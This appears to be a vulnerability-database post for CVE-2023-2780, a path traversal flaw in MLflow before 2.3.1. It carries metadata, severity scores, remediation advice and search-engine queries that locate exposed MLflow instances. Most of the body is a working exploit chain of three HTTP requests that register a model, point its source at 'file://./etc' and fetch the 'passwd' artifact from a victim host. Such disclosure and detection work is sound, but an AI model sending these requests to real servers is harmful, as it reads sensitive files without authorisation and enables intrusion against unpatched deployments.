---
layout: "post"
cve_id: "CVE-2023-2780"
title: "Mlflow <2.3.1 - Local File Inclusion Bypass"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-2780.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-2780.yaml"
author: "iamnoooob,pdresearch"
severity: "critical"
impact: "Successful exploitation could allow an attacker to read sensitive files on the server.
"
remediation: "Upgrade Mlflow to version 2.3.1 or later to mitigate the vulnerability.
"
reference:
  - "https://huntr.dev/bounties/b12b0073-0bb0-4bd1-8fc2-ec7f17fd7689/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-2780"
  - "https://github.com/mlflow/mlflow/commit/fae77a525dd908c56d6204a4cef1c1c75b4e9857"
  - "https://github.com/Ostorlab/KEV"
  - "https://github.com/Ostorlab/known_exploited_vulnerbilities_detectors"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2023-2780"
  cwe-id: "CWE-29"
  epss-score: 0.86155
  epss-percentile: 0.99356
  cpe: "cpe:2.3:a:lfprojects:mlflow:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 3
  vendor: "lfprojects"
  product: "mlflow"
  shodan-query: "http.title:\"mlflow\""
  fofa-query: ['title="mlflow"', 'app="mlflow"']
  google-query: "intitle:\"mlflow\""
tags:
  - "cve2023"
  - "cve"
  - "mlflow"
  - "oss"
  - "lfi"
  - "huntr"
  - "intrusive"
  - "lfprojects"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
Path Traversal: '\..\filename' in GitHub repository mlflow/mlflow prior to 2.3.1.


## ðŸŒ HTTP Request
```nohighlight
POST /ajax-api/2.0/mlflow/registered-models/create HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 38
Content-Type: application/json; charset=utf-8
Accept-Encoding: gzip

{"name":"36h9UN8Lgruvz1pj5DXAppyiMYO"}
```

```nohighlight
POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5
Connection: close
Content-Length: 62
Content-Type: application/json; charset=utf-8
Accept-Encoding: gzip

{"name":"36h9UN8Lgruvz1pj5DXAppyiMYO","source":"file://./etc"}
```

```nohighlight
GET /model-versions/get-artifact?path=passwd&name=36h9UN8Lgruvz1pj5DXAppyiMYO&version=dlAQ94 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Connection: close
Accept-Encoding: gzip
```


